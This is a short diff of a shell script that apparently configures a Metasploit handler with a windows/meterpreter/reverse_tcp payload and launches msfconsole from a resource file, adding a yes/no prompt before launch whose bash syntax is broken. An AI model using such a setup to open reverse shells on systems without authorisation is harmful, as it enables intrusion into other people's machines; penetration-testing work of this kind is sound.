@@ -10,4 +10,12 @@ read port;
 
 payload=windows/meterpreter/reverse_tcp
 
-msfconsole -r file.msf
+echo "Do you want to start metasploit ?? y or n"
+read start;
+if(start == "y" || start == "Y"); then
+  msfconsole -r file.msf
+else 
+  echo "Bye BYe!!"
+fi
+
+
